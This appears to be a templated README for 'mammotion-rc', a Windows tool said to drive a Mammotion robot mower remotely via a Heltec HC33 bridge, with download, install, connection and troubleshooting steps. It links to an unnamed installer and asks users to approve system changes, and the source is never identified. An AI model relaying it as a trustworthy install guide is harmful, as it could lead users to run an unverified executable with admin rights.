🚜 mammotion-rc - Control your mower from any location

Download Software Here

This application lets you operate your Mammotion robot mower through the internet. Connect your Heltec HC33 device to bridge your mower connection. Once set up, you see a live camera feed, check status, and use a joystick interface on your web browser.

📋 System Requirements

Before you begin, ensure your computer meets these conditions:

  • A Windows 10 or 11 computer.
  • A working Wi-Fi connection.
  • One Heltec HC33 hardware module.
  • A modern web browser like Chrome or Edge.

💾 Getting the Software

Follow these steps to obtain the files for your system:

  1. Go to the official release page.
  2. Locate the latest version visible on the screen.
  3. Select the Windows installer file ending in .exe.
  4. Save the file to your Downloads folder.

⚙️ Installation Steps

Once you download the file, complete the setup process:

  1. Double-click the downloaded file to start the installation.
  2. Follow the prompts on your screen.
  3. Click "Yes" if your computer asks to allow changes to your system.
  4. Close the window after the progress bar finishes.

🕹️ Connecting Your Mower

Your Heltec HC33 acts as the middleman between your mower and the software. Plug this device into a power source near your mower. Ensure the device connects to your local Wi-Fi network. Open the software on your computer. Enter the IP address of your Heltec device when the screen prompts you for connection data. The software saves your settings for future use automatically.

✅ How to Control

After a successful connection, the dashboard loads in your browser. You see a live camera view at the center of the screen. Use your mouse to move the joystick icons. These icons send movement commands to your mower. The status panel at the top shows battery levels and active alert information.

🛠️ Troubleshooting

If you face issues, try the following steps:

  • Check that your mower and your computer are on the same network.
  • Restart your Heltec HC33 module by unplugging the power and plugging it back in.
  • Verify that your firewall allows the software to communicate over the web.
  • Refresh your browser page to reload the controls.
